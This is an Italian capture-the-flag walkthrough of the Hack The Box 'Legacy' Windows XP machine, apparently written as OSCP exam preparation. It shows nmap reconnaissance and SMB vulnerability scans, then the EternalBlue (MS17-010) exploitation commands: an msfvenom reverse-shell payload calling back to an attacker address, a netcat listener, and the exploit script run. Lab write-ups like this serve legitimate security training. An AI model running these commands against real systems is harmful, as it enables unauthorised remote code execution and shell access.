# Legacy

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.4
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.4
Host is up (0.046s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/21%OT=135%CT=1%CU=30271%PV=Y%DS=2%DC=I%G=Y%TM=65
OS:5C7054%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=110%TI=I%CI=I%II=I%SS=
OS:S%TS=0)SEQ(SP=105%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=0)SEQ(SP=FD%GCD=1
OS:%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=0)SEQ(SP=FE%GCD=1%ISR=110%TI=I%CI=I%II=I
OS:%SS=S%TS=0)SEQ(SP=FF%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=0)OPS(O1=M54DN
OS:W0NNT00NNS%O2=M54DNW0NNT00NNS%O3=M54DNW0NNT00%O4=M54DNW0NNT00NNS%O5=M54D
OS:NW0NNT00NNS%O6=M54DNNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%
OS:W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M54DNW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M54DNW0NNT00NNS%RD=0%Q=)T4(R=Y%DF=N%T=
OS:80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=80%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:35:69 (VMware)
|_clock-skew: mean: 5d00h57m40s, deviation: 1h24m50s, median: 4d23h57m40s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-11-26T12:52:14+02:00
|_smb2-time: Protocol negotiation failed (SMB2)
```

Provo ad eseguire una scansione completa:

```text
sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 0.0.0.0
```

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.4
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Aggressive OS guesses: Microsoft Windows XP SP2 or SP3 (96%), Microsoft Windows XP SP3 (96%), Microsoft Windows Server 2003 SP1 or SP2 (94%), Microsoft Windows Server 2003 SP2 (94%), Microsoft Windows Server 2003 SP1 (94%), Microsoft Windows 2003 SP2 (94%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (93%), Microsoft Windows 2000 SP4 (93%), Microsoft Windows XP Professional SP2 or Windows Server 2003 (93%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m51s, median: 4d23h57m39s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:35:69 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-11-26T12:54:15+02:00
```

Inifine, eseguo un'ultima scansione udp:

```text
sudo nmap -sU -O -p- -oA /usr/share/nmap/udp 0.0.0.0
```

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.4
Host is up (0.047s latency).
Not shown: 65527 closed udp ports (port-unreach)
PORT     STATE         SERVICE
123/udp  open          ntp
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
445/udp  open|filtered microsoft-ds
500/udp  open|filtered isakmp
1025/udp open|filtered blackjack
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
```

Passo quindi alla fase successiva.

## Enumeration

Dalle scansioni precedenti un entry point possibile è quello relativo a SMB. Per questo motivo lancio una scansione nmap per scoprire se esistono delle vulnerabilità:

```text
nmap -v -script smb-vuln* -p 139,445 10.10.10.4
```

Ottengo il seguente risultato:

```text
Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

L'output della scansione mostrà che il sistema è vulnerabile alle seguenti CVE:
  - CVE-2009–3103
  - CVE-2017–0143
  - CVE-2008–4250

Proseguo tentando di sfruttare la CVE-2017–0143 (MS17–010).


## Exploitation

In particolare la vulnerabilità in questione si chiama Eternal Blue. Questa sfrutta l'implementazione del protocollo Server Message Block (SMB), inviando un pacchetto modificato in maniera specifica per ottenere il permesso di eseguire codice sulla macchina target.

In questo [articolo](https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/) viene spiegato come sfruttare la vulnerabilità (senza l'utilizzo di Metasploit).

Per prima cosa scarico questo repository da github:

```text
git clone https://github.com/helviojunior/MS17-010.git
```

Creo una reverse-shell tramite l'utilizzo di _MSFvenom_ (RICORDARE CHE E' POSSIBILE FARLO DURANTE L'ESAME OSCP MA NON DEVE ESSERE UTILIZZATO IL METERPRETER):

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=9999 -f exe > eternalblue.exe
```

Avvio un listener sulla porta 9999:

```text
nc -nlvp 9999
```

Ed eseguo l'exploit:

```text
python send_and_execute.py 10.10.10.4 eternalblue.exe
```

**Sono dentro!**

<p align="center">
  <img src="/Immagini/Windows-Box/Legacy/legacy-1.png"/>
</p>

Navigando tra le directory mi rendo conto che non c'è bisogno di scalare i privilegi per questa macchina, in quanto c'è sia il flag user che quello root.
